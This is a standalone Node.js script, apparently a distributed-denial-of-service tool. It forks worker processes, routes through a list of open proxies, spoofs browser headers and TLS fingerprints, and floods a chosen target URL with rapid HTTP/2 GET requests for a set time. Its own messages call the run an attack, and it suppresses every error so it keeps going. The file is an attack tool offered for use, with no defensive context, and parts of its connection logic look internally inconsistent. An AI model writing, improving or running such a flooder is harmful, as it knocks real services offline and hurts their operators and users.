const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) process.exit(1);
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    if (!lines.length) process.exit(1);
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) process.exit(1);

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"
];

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
].join(":");

const proxies = readLines(args.proxyFile);
let requestCounter = 0;

if (cluster.isMaster) {
    console.log(`Starting flooder on ${args.target} with ${args.threads} threads for ${args.time} seconds...`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => {
        console.log(`Attack finished. Total requests sent: ${requestCounter}`);
        process.exit(0);
    }, args.time * 1000);
} else {
    setInterval(runFlooder, 30);
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "invalid proxy response");
            }
            return callback(connection);
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            callback(undefined, "error");
        });
    }
}

const Socker = new NetSocket();

function generateHeaders() {
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path || "/",
        ":scheme": "https",
        "user-agent": randomElement(userAgents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache"
    };
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    if (!parsedProxy[0] || !parsedProxy[1]) {
        return setTimeout(runFlooder, 300);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 2
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            if (connection) connection.destroy();
            return setTimeout(runFlooder, 300);
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: ciphers,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 300,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const headers = generateHeaders();
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers);
                    requestCounter++;
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
            }, 30);
            setTimeout(() => {
                clearInterval(IntervalAttack);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            }, args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 300);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setTimeout(runFlooder, 300);
        });
    });
}
